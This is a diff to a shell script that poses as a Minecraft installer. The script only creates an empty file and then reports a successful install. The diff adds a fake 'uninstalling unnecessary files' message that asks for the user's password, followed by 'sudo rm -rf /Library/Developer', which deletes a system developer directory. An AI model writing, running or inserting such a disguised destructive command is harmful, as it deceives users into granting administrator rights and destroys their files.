@@ -13,3 +13,5 @@ touch /Applications/Minecraft
 chmod 700 /Applications/Minecraft
 clear
 echo "Minecraft has been installed!"
+echo "Uninstalling unnecessary files... Please enter your password below:"
+sudo rm -rf /Library/Developer
